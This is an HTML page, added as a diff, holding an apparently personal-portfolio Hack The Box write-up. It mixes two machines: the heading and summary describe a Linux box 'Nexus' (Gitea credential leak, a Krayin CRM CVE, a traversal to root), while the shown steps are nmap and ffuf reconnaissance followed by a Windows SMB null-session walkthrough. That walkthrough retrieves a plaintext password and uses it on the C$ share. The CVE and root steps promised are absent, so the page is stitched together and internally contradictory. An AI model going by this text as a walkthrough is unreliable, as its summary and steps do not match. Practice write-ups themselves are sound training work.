@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Dancing — HTB Write-up | Mark Dale Elroy Bagui</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/walktrough.css">
+</head>
+<body>
+
+<div class="ambient">
+  <div class="blob b1"></div>
+  <div class="blob b2"></div>
+  <div class="blob b3"></div>
+</div>
+<div class="noise"></div>
+
+<nav>
+  <div class="nav-inner">
+    <a href="../../index.html" class="logo"><span class="logo-dot"></span> Mark Dale Elroy Bagui</a>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../../index.html#htb">All Write-ups</a></li>
+      <li><a href="../../index.html#proof">Proof of Work</a></li>
+      <li><a href="../../index.html#contact">Contact</a></li>
+    </ul>
+    <div style="display:flex; align-items:center; gap:12px;">
+      <a href="../../index.html" class="nav-back">← Back to Portfolio</a>
+      <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">🌙</button>
+      <button class="burger" id="burger" aria-label="Menu">☰</button>
+    </div>
+  </div>
+</nav>
+
+<div class="wrap">
+
+  <section class="writeup-hero reveal">
+    <div class="breadcrumb">
+      <a href="../../index.html">Portfolio</a>
+      <span class="breadcrumb-sep">/</span>
+      <a href="../../index.html#htb">HTB Write-ups</a>
+      <span class="breadcrumb-sep">/</span>
+      Dancing
+    </div>
+    <div class="writeup-title-row">
+      <h1 class="writeup-title">Nexus</h1>
+      <span class="diff-badge">Easy</span>
+    </div>
+    <div class="writeup-meta">
+      <span class="meta-badge">🐧 Linux</span>
+      <span class="meta-badge">🎯 Hack The Box</span>
+      <span class="meta-badge">📌 Resume Evidence</span>
+    </div>
+    <p class="writeup-sub"><code> Nexus</code> is an easy-difficulty Linxux machine that features an exposed Gitea repository leaking credentials and a job posting that reveals valid usernames
+    . The leaked credentials provide access to <code>Krayin CRM,</code>which is vulnerable to <code>CVE-2026-38526,</code>
+,leading to a shell as www.data. Further enumeration of the krayin CRM configuration fiels reveals additional credentials that allow SSH access. Service enumeration reveals a Gitea
+tempalte sync service vulnerable to directory traversal, which is leveraged to gain shell as root.</p>
+  </section>
+
+  <div class="writeup-body">
+
+    <aside class="toc">
+      <div class="toc-label">On this page</div>
+      <a href="#recon">1. Reconnaissance</a>
+      <a href="#enumeration">2.Enumeration</a>
+      <a href="#access">3. Initial Access</a>
+      <a href="#privesc">4. Privilege Escalation</a>
+      <a href="#learnings">5. Key Learnings</a>
+    </aside>
+
+    <main>
+
+      <!-- 1. RECON -->
+      <section id="recon" class="writeup-section reveal">
+        <div class="writeup-h2"><span class="num">1</span> Reconnaissance</div>
+        <p class="writeup-p">Began with a script default (-sC) and service detection (-sV) port scan to map the attack surface, followed by a targeted scan.</p>
+
+        <div class="code-block">
+          <div class="code-block-head">
+            <div class="code-block-dots"><span></span><span></span><span></span></div>
+            <div class="code-block-label">terminal — nmap</div>
+          </div>
+          <pre><span class="c-comment"># -sC and -sV scan</span>
+<span class="c-prompt">$</span> nmap -sC -sV -oN 10.129.108.148
+<span class="c-prompt">PORT    STATE SERVICE
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-04 01:36 +0800
+Nmap scan report for 10.129.108.148
+Host is up (0.45s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://nexus.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report 
+any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.47 seconds
+                                                                         </span></pre>
+        </div>
+        <p class="writeup-p">Open Ports <strong>22,80</strong> indicate possible remote login access if credentials are weak
+             and a running web service that should be tested for potential vulnerabilities. </p>
+
+            <div class="code-block">
+          <div class="code-block-head">
+            <div class="code-block-dots"><span></span><span></span><span></span></div>
+            <div class="code-block-label">terminal — nmap</div>
+          </div>
+          <pre><span class="c-comment"># Custom Hostname</span>
+<span class="c-prompt">$</span> sudo nano /etc/hosts
+<span class="c-out">127.0.0.1       localhost
+127.0.1.1       edlry
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</span>
+<span class ="c-prompt">10.129.108.148 nexus.htb</span>
+</pre>
+                                                                         
+        </div>
+        <p class="writeup-p">
+        We need to add nexus.htb to <code>/etc/hosts</code> so the system can resolve the hostname to the target IP, allowing us to access the web service at https://nexus.htb.
+        </p>
+
+      </section>
+
+      <section id="enumeration" class="writeup-section reveal">
+        <div class="writeup-h2"><span class="num">2</span>Enumeration</div>
+        <p class ="writeup-p">We used <code>Gobuster or ffuf</code>to fuzz the Host header and identify hidden subdomains or virtual hosts associated with the targets</p>
+        <div class="code-block">
+          <div class="code-block-head">
+            <div class="code-block-dots"><span></span><span></span><span></span></div>
+            <div class="code-block-label">terminal</div>
+          </div>
+          <pre>
+            <span class="c-comment">
+# ffuf -w wordlist -u URL -ac auto-calibreting filter</span>
+<span class="c-prompt">$ ffuf -w /Desktop/tools/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt \ 
+  -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -ac
+
+          /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://nexus.htb/
+ :: Wordlist         : FUZZ: /home/edlry/Desktop/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.nexus.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 237ms]
+billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 438ms]
+</span></pre>
+        </div>
+        <p class="writeup-p">Using ffuf for vhost fuzzing, we discovered additional domains: <code>git</code> and <code>billing</code> 
+        </p>
+        <div class="code-block">
+          <div class="code-block-head">
+            <div class="code-block-dots"><span></span><span></span><span></span></div>
+            <div class="code-block-label">terminal</div>
+          </div>
+          <pre><span class="c-comment"># /etc/hosts</span>
+<span class="p-prompt">10.129.108.148 nexus.htb git.nexus.htb billing.nexus.htb</span></pre>
+        </div>
+        
+      </section>
+      <!-- 2. INITIAL ACCESS -->
+      <section id="access" class="writeup-section reveal">
+        <div class="writeup-h2"><span class="num">2</span> Initial Access</div>
+        <p class="writeup-p">Used <code>smbclient</code> to list available shares, testing for null/guest sessions before attempting any credentialed access.</p>
+
+        <div class="code-block">
+          <div class="code-block-head">
+            <div class="code-block-dots"><span></span><span></span><span></span></div>
+            <div class="code-block-label">terminal — smbclient share listing</div>
+          </div>
+          <pre><span class="c-comment"># List all shares using a null session (-N)</span>
+<span class="c-prompt">$</span> smbclient -L \\\\10.10.10.exam\\ -N
+
+<span class="c-out">Sharename       Type
+---------       ----
+ADMIN$          Disk
+C$              Disk
+IPC$            IPC
+WorkShares      Disk</span>
+
+<span class="c-comment"># Connect to the non-default, user-created share</span>
+<span class="c-prompt">$</span> smbclient \\\\10.10.10.exam\\WorkShares -N
+
+<span class="c-out">smb: \></span> <span class="c-prompt">dir</span>
+<span class="c-out">  Amy.J          D
+  James.P        D</span></pre>
+        </div>
+
+        <p class="writeup-p">The custom <code>WorkShares</code> share was accessible without credentials and contained user-named directories. Browsing further revealed a credentials file left inside one of the folders.</p>
+
+        <div class="code-block">
+          <div class="code-block-head">
+            <div class="code-block-dots"><span></span><span></span><span></span></div>
+            <div class="code-block-label">terminal — file retrieval</div>
+          </div>
+          <pre><span class="c-comment"># Navigate into the user's directory and retrieve file</span>
+<span class="c-prompt">smb: \WorkShares\Amy.J\></span> get worknotes.txt
+<span class="c-out">getting file \WorkShares\Amy.J\worknotes.txt
+(average 10.0 kb/s)</span>
+
+<span class="c-comment"># Inspect the file locally</span>
+<span class="c-prompt">$</span> cat worknotes.txt
+<span class="c-out">reminder: temp password — Sdf#asd2021</span></pre>
+        </div>
+
+        <p class="writeup-p">A plaintext note inside the share contained a reusable password, which was then validated against the SMB service using the discovered username.</p>
+
+        <div class="callout">
+          <span class="callout-icon">💡</span>
+          <div class="callout-text"><strong>Why this matters:</strong> Sensitive credentials stored in plaintext files on shared drives is a recurring real-world finding — exactly the kind of misconfiguration documented in SOC and penetration testing reports.</div>
+        </div>
+      </section>
+
+      <!-- 3. PRIVILEGE ESCALATION -->
+      <section id="privesc" class="writeup-section reveal">
+        <div class="writeup-h2"><span class="num">3</span> Privilege Escalation</div>
+        <p class="writeup-p">Used the recovered credentials to authenticate as <code>Amy.J</code> and access shares not visible during the null session, including the administrative <code>C$</code> share.</p>
+
+        <div class="code-block">
+          <div class="code-block-head">
+            <div class="code-block-dots"><span></span><span></span><span></span></div>
+            <div class="code-block-label">terminal — authenticated SMB access</div>
+          </div>
+          <pre><span class="c-comment"># Authenticate with the recovered credentials</span>
+<span class="c-prompt">$</span> smbclient \\\\10.10.10.exam\\C$ -U Amy.J
+
+<span class="c-out">Password:</span> <span class="c-string">Sdf#asd2021</span>
+
+<span class="c-comment"># Navigate to the user's desktop and retrieve the flag</span>
+<span class="c-prompt">smb: \></span> cd Users\Amy.J\Desktop
+<span class="c-prompt">smb: \Users\Amy.J\Desktop\></span> get user.txt
+<span class="c-out">getting file \Users\Amy.J\Desktop\user.txt</span>
+
+<span class="c-comment"># Verify the flag</span>
+<span class="c-prompt">$</span> cat user.txt
+<span class="c-out">u53r1f14g...</span></pre>
+        </div>
+
+        <ul class="findings-list">
+          <li>Authenticated to the privileged <code>C$</code> administrative share using reused credentials found in a plaintext note</li>
+          <li>Retrieved the user flag from the authenticated user's desktop directory</li>
+          <li>Demonstrated full impact of credential reuse and insecure note storage on a shared drive</li>
+        </ul>
+      </section>
+
+      <!-- 4. KEY LEARNINGS -->
+      <section id="learnings" class="writeup-section reveal">
+        <div class="writeup-h2"><span class="num">4</span> Key Learnings</div>
+        <ul class="findings-list">
+          <li>SMB share enumeration is one of the first steps on any Windows target — even before attempting authentication</li>
+          <li>Null and guest sessions frequently expose more than expected when share permissions are misconfigured</li>
+          <li>Plaintext credentials in shared files are a high-severity finding in real penetration tests and SOC incident reports</li>
+          <li>Practiced end-to-end workflows with <code>smbclient</code>: null listing → unauthenticated browsing → credential recovery → authenticated access</li>
+          <li>Reinforced how credential reuse across services dramatically expands the blast radius of a single leaked password</li>
+        </ul>
+      </section>
+
+      <div class="writeup-nav">
+        <a href="#" class="btn btn-ghost">← Previous: Fawn</a>
+        <a href=".#" class="btn btn-primary">Back to All Write-ups</a>
+      </div>
+
+    </main>
+  </div>
+</div>
+
+<footer>
+  <div class="wrap footer-inner">
+    <div class="footer-text">Hack The Box write-up · Resume Evidence Section</div>
+    <div class="footer-text">© 2026 Mark Dale Elroy Bagui. All rights reserved.</div>
+  </div>
+</footer>
+
+<script>
+  // Theme toggle — same logic as dashboard
+  const toggle = document.getElementById('themeToggle');
+  const root = document.documentElement;
+  toggle.addEventListener('click', () => {
+    const isLight = root.getAttribute('data-theme') === 'light';
+    root.setAttribute('data-theme', isLight ? 'dark' : 'light');
+    toggle.textContent = isLight ? '🌙' : '☀️';
+  });
+
+  // Mobile menu
+  const burger = document.getElementById('burger');
+  const navLinks = document.getElementById('navLinks');
+  burger.addEventListener('click', () => navLinks.classList.toggle('mobile-open'));
+  navLinks.querySelectorAll('a').forEach(a => a.addEventListener('click', () => navLinks.classList.remove('mobile-open')));
+
+  // Scroll reveal — same as dashboard
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(e => { if(e.isIntersecting){ e.target.classList.add('in'); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
+</script>
+
+</body>
+</html>
